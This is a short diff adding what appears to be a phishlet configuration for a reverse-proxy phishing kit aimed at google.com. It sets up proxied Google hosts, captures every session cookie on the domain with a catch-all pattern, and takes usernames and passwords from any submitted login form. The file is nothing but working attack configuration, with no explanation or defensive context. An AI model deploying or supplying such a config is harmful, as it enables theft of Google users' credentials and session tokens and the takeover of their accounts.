@@ -1,0 +1,20 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: true}
+sub_filters: []
+auth_tokens:
+  - domain: 'google.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'null'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'null'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.google.com'
+  path: '/sDjmX87GHc4jbyrz4uwn4vUiXZBlZHYZRwcMgyBvh6jVlDHD6EgIz6uuU215'
